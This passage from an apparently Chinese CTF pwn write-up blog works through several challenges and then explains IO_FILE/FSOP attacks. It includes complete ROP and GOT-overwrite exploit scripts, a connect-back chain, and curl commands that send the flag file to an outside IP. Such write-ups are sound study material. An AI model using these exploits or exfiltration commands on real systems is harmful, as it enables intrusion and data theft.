class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rsp)+p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi_r15)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h2><p>第一次遇见<code>close(0);close(1);close(2)</code>,以为没啥，就普通的orw,结果发现自己的read根本写不上去，查了下才发现关闭了标准输入输出，所以无法再和程序交互，无法交互我一下就想起了侧信道，但是试过发现本地可以远程还是不行，咨询了学长才明白，远程关闭了标准输入输出流即远程题目的socket也就断了，所以无法判断程序的状态了，后来研究了学长的wp和官网wp稍微搞懂了一点。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在远程使用<code>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</code>起一个socket客户端服务，然后使用connect连接我方服务器<code>connect(soc, (struct sockaddr *)&amp;serv_addr, sizeof(struct sockaddr_in))</code>，然后<code>write(socketfd,flag_addr.size)</code>,把flag传到我方服务器上面。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process([&#x27;./ld.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27264</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dump of assembler code for function backDoor:</span></span><br><span class="line"><span class="string">   0x0000000000401349 &lt;+0&gt;:	endbr64 </span></span><br><span class="line"><span class="string">   0x000000000040134d &lt;+4&gt;:	push   rbp</span></span><br><span class="line"><span class="string">   0x000000000040134e &lt;+5&gt;:	mov    rbp,rsp</span></span><br><span class="line"><span class="string">   0x0000000000401351 &lt;+8&gt;:	syscall </span></span><br><span class="line"><span class="string">   0x0000000000401353 &lt;+10&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401354 &lt;+11&gt;:	pop    rdx</span></span><br><span class="line"><span class="string">   0x0000000000401355 &lt;+12&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401356 &lt;+13&gt;:	pop    rdi</span></span><br><span class="line"><span class="string">   0x0000000000401357 &lt;+14&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401358 &lt;+15&gt;:	pop    rsi</span></span><br><span class="line"><span class="string">   0x0000000000401359 &lt;+16&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135a &lt;+17&gt;:	pop    rax</span></span><br><span class="line"><span class="string">   0x000000000040135b &lt;+18&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135c &lt;+19&gt;:	push   rax</span></span><br><span class="line"><span class="string">   0x000000000040135d &lt;+20&gt;:	pop    rcx</span></span><br><span class="line"><span class="string">   0x000000000040135e &lt;+21&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135f &lt;+22&gt;:	mov    rdi,rcx</span></span><br><span class="line"><span class="string">   0x0000000000401362 &lt;+25&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401363 &lt;+26&gt;:	nop</span></span><br><span class="line"><span class="string">   0x0000000000401364 &lt;+27&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">   0x0000000000401365 &lt;+28&gt;:	ret    </span></span><br><span class="line"><span class="string">End of assembler dump.</span></span><br><span class="line"><span class="string">0x0000000000401347: leave; ret;</span></span><br><span class="line"><span class="string">0x0000000000401014: call rax;</span></span><br><span class="line"><span class="string">0x000000000040116C                 jmp     rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">socket_addr=<span class="number">0x403700</span>+<span class="number">0x1a0</span></span><br><span class="line">flag_addr=<span class="number">0x403700</span>+<span class="number">0x1b0</span></span><br><span class="line">target=<span class="number">0x403700</span>+<span class="number">0x1c0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pop_rax=<span class="number">0x000000000040135a</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401356</span></span><br><span class="line">    pop_rsi=<span class="number">0x0000000000401358</span></span><br><span class="line">    pop_rdx=<span class="number">0x0000000000401354</span></span><br><span class="line">    syscall_ret=<span class="number">0x0000000000401351</span></span><br><span class="line">    leave_ret=<span class="number">0x0000000000401347</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(target)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0x30</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#socket(2,1,0)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">41</span>)+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">1</span>)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#connect(socketfd,server_addr,0x10)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">42</span>)+p64(pop_rdi)</span><br><span class="line">    payload+=p64(<span class="number">1</span>)+p64(pop_rsi)+p64(socket_addr)</span><br><span class="line">    payload+=p64(pop_rdx)+p64(<span class="number">0x10</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(target)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">    payload+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload=payload.ljust(<span class="number">0x1a0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line">    payload+=p64(<span class="number">0x0100007f901f0002</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>注意server_addr的格式，其中ip地址和端口号都得反着写。</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>第一看这么多的伪代码，看了一个下午才看明白，然后写脚本又花了很长时间，很麻烦，但也知道了很多东西。</p>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>漏洞并不难以利用，但关键的是在茫茫码海中找见他，找见就很轻松了，漏洞主要来源于一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#得到<span class="function">elf_addr</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">( type == <span class="number">102</span> )</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ( a5 &gt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( *(__int64 *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] &lt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(</span><br><span class="line">              buf,</span><br><span class="line">              <span class="string">&quot;Let us look. Oh! That is %p -&gt; \&quot;%s\&quot;.\n&quot;</span>,</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]],</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]]);</span><br><span class="line">            v9 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            send(acceptfd, buf, v9, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">#任意地址写</span><br><span class="line"><span class="keyword">if</span> ( type == <span class="number">241</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        *(_QWORD *)(*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] + *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">4</span>]) = *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">6</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf, <span class="string">&quot;All right.I know what you say.\n&quot;</span>);</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">        send(acceptfd, buf, v11, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是报文的目录的参数格式，在传参的时候需要base64编码（别问我怎么知道的），但是不能直接传编码后的字符串，得把后面的等号去掉才行（对比别人的wp发现的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr1;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr2;</span><br><span class="line">    <span class="keyword">uint64_t</span> write_for_addr;</span><br><span class="line">&#125;</span><br><span class="line">type==<span class="number">0xf1</span>&amp;&amp;a5&lt;=<span class="number">2</span>:</span><br><span class="line">    *(addr1+addr2)=write_for_addr;</span><br><span class="line">type==<span class="number">0x88</span>&amp;&amp;a5&lt;=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,*(addr1+addr2))</span><br><span class="line">type==<span class="number">0x66</span>&amp;&amp;a5==<span class="number">0</span>&amp;&amp;addr1&lt;=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p-&gt;%s&quot;</span>,(&amp;off_6140[addr1]),(&amp;off_6140[addr1]))</span><br><span class="line">type==<span class="number">0x12</span>&amp;&amp;addr1==<span class="string">&#x27;ping&#x27;</span>&amp;<span class="built_in">strlen</span>(&amp;addr2)&lt;=<span class="number">0xf</span></span><br><span class="line">        show</span><br></pre></td></tr></table></figure>

<p>然后利用上面代码的漏洞对got表发起攻击把strcmp改成system,但是注意不能system(“/bin/sh”),首先是shell的输入输出没有和socket绑定，其次当我们再次发送报文的时候会fork一个新进程来处理我们的报文，而不是发送给shell，所以需要反弹shell或者反弹flag,有很多反弹shell的命令但都没用，有两个反弹flag的命令能用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;curl 47.107.28.194/`cat flag`&#x27;)</span><br><span class="line">system(&#x27;curl -X POST -F \&quot;flag=@/flag\&quot; 47.107.28.194:8080&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># ip=&#x27;127.0.0.1&#x27;</span></span><br><span class="line"><span class="comment"># port=4000</span></span><br><span class="line">ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">27718</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload1=p32(<span class="number">1</span>)+p32(<span class="number">0x66</span>)+p64(<span class="number">4</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload1=base64.b64encode(payload1)</span><br><span class="line">payload1=payload1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload1)</span><br><span class="line"><span class="built_in">print</span> url1</span><br><span class="line">sh.send(url1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let us look. Oh! That is &#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x4070</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload2=p32(<span class="number">1</span>)+p32(<span class="number">0x88</span>)+p64(elf_base)+p64(<span class="number">0x6070</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2=base64.b64encode(payload2)     </span><br><span class="line">payload2=payload2.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url2=url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload2)</span><br><span class="line">sh.send(url2)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK! I give you some message!\nMessage: &#x27;</span>)</span><br><span class="line">printf_addr=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">strcmp_got=elf_base+elf.got[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload3=p32(<span class="number">2</span>)+p32(<span class="number">241</span>)+p64(strcmp_got)</span><br><span class="line">payload3+=p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">payload3+=p32(<span class="number">0x22</span>)+<span class="string">&quot;curl 47.107.28.194/`cat flag`&quot;</span></span><br><span class="line">payload3=base64.b64encode(payload3)     </span><br><span class="line">payload3=payload3.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url3=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload3)</span><br><span class="line">sh.send(url3)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;All right.I know what you say&#x27;</span>)</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对pwn理解的更深了，说白了就是对指定的ip和端口发起socket连接，然后把sh.send的内容发送给这个端口的应用。</p>
<p>最近做题感觉漏洞利用简单，代码审计困难的题目越来越多。</p>
<h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><p>存在off by null漏洞，但只能申请largebin的堆块，所以可以进行larginbinattack，然后largebin上申请到的堆块可以泄露libc地址，在堆上布置然后打io_list_all就行了，重点讲一下io_list_all，我的主要学习来源是ctfwiki，对io_list_all的攻击也叫作FSOP.</p>
<p>在讲解FSOP前先讲一讲io_file结构，之前在stdout泄露libc基地址的时候讲过，但不是很深入，这里再梳理一次</p>
<p>io_file是一组织io操作的文件结构体，当打开有io操作的设备时就会生成对应的io_file结构体,比如stdout,stdin,stderr，io_file代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>file主要是对设备io操作的一些信息，vtable是一个虚表，里面记录了很多的函数地址，在io操作的时候会拿vtable里的地址跳转执行，据ctfwiki所说，在libc2.23的情况的下可以直接修改io_file_plus的vtable地址，可以伪造一个vtable然后修改io_file_plus的vtable地址指向我们的伪造的vtable(任意地址写)，然后对vtable的使用情况填上ogg或者system_addr,这种方法只适合在Libc2.23使用（在libc2.23下vtable表是不可以写入的，所以不能修改vtable里的内容）。</p>
<p>注意io_file file并不是一个指针而是给他实际分配了空间io_file_plus的完全体实际上是这样的,其中vtable相对于io_file_plus的偏移是0xd8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">file</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>程序打开了很多设备代表着有很多的io_file_plus结构体，这些结构体以链表进行组织，其中next域是file的_chain，这个链表是单链表，链表头记录在io_list_all中，其中一般的链表头的io_file_plus是stderr</p>
